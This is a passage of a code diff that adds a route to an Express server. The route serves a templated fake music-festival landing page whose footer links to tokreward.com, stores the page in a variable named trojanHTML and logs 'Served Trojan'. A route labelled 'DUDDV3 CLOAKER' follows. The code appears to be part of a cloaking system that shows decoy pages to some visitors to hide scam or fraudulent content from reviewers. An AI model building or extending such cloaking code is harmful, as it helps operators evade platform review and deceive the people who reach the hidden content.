+                    justify-content: space-around;
+                    margin-top: 2em;
+                }
+                .artist {
+                    flex-basis: 30%;
+                    margin-bottom: 2em;
+                    text-align: center;
+                }
+                .artist img {
+                    width: 200px;
+                    height: 200px;
+                    border-radius: 50%;
+                    object-fit: cover;
+                }
+                .schedule {
+                    background-color: #2a2a2a;
+                    padding: 2em;
+                    border-radius: 10px;
+                    margin-top: 2em;
+                }
+                footer {
+                    background: linear-gradient(45deg, #f9d423, #ff4e50);
+                    color: #1a1a1a;
+                    text-align: center;
+                    padding: 1em;
+                    margin-top: 2em;
+                }
+                footer a {
+                    color: #ffffff;
+                    text-decoration: none;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Music Fest 2024</h1>
+            </header>
+            <div class="container">
+                <main>
+                    <h2>Experience the Beat</h2>
+                    <p>Welcome to the most electrifying music event of the year! ${slug} Music Festival brings together top artists and emerging talents for an unforgettable celebration of sound.</p>
+                    <div class="lineup">
+                        <div class="artist">
+                            <img src="https://placehold.co/200x200/ff4e50/ffffff?text=Artist+1" alt="Artist 1">
+                            <h3>Electro Pulse</h3>
+                        </div>
+                        <div class="artist">
+                            <img src="https://placehold.co/200x200/f9d423/ffffff?text=Artist+2" alt="Artist 2">
+                            <h3>Rhythm Rebels</h3>
+                        </div>
+                        <div class="artist">
+                            <img src="https://placehold.co/200x200/ff4e50/ffffff?text=Artist+3" alt="Artist 3">
+                            <h3>Melody Makers</h3>
+                        </div>
+                    </div>
+                    <div class="schedule">
+                        <h3>Festival Schedule</h3>
+                        <p>Day 1: Electronic Dance Night</p>
+                        <p>Day 2: Rock & Alternative Showcase</p>
+                        <p>Day 3: Pop & Indie Extravaganza</p>
+                    </div>
+                </main>
+            </div>
+            <footer>
+                <p>Feel the music with ${slug} &copy; 2024 ${slug} Music Festival | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 948 Trojan (${slug})`);
+});
 
 // DUDDV3 CLOAKER
 app.get('/duddv3/:slug', (req, res, next) => {
